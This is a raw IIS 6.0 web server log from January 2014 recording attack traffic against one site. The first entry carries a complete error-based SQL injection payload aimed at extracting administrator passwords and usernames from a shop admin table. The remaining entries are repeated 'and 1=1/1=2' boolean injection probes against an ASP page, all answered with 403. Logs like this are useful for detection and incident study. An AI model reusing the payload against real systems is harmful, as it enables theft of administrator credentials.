#Software: Microsoft Internet Information Services 6.0
#Version: 1.0
#Date: 2014-01-14 18:52:39
#Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken 
2014-01-14 18:52:39 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /shopadmin/index.php ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1 80 - 123.150.156.136 HTTP/1.1 Mozilla/4.0+(compatible;+Win32;+WinHttp.WinHttpRequest.5) - - www.178898.com 403 0 0 1656 552 78
#Software: Microsoft Internet Information Services 6.0
#Version: 1.0
#Date: 2014-01-15 14:48:24
#Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken 
2014-01-15 14:48:24 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=288%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 484
2014-01-15 14:48:25 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=319%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 562
2014-01-15 14:48:26 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=283%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 531
2014-01-15 14:48:27 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=319%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 484
2014-01-15 14:48:27 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=283%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 406
2014-01-15 14:48:29 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=259%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 546
2014-01-15 14:48:29 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=288%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 453
2014-01-15 14:48:29 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=282%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 406
2014-01-15 14:48:30 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=259%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 437
2014-01-15 14:48:30 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=282%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 0 1656 190 468
2014-01-15 15:02:14 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=319%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 500
2014-01-15 15:02:14 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=283%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 531
2014-01-15 15:02:15 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=288%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 453
2014-01-15 15:02:16 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=283%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 500
2014-01-15 15:02:17 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=288%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 0 1656 190 453
2014-01-15 15:02:17 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=319%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 1078
2014-01-15 15:02:18 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=259%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 921
2014-01-15 15:02:18 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=259%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 343
2014-01-15 15:02:20 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=282%20and%201=1 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 453
2014-01-15 15:02:21 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /showflxx.asp id=282%20and%201=2 80 - 113.201.32.36 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.0) ASPSESSIONIDCQDCRATA=MIOFMLEDFBOAFFMECBNKHINE - www.178898.com 403 0 64 182 190 328
